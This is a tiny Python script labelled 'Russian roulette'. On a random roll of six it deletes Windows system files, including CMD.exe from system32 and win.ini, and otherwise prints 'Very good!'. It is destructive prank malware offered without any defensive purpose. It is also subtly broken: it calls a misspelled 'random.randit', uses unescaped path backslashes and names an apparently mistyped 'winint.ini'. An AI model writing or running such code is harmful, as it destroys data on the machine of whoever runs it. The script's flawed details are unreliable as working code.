import os
import random

number = random.randit(1,6)

if number == 6:
    os.remove('c:\windows\system32\CMD.exe')
    os.remove('c:\windows\win.ini')
    os.remove('c:\windows\winint.ini')

else:
    print("Very good!")

#RUSSIAN ROULETTE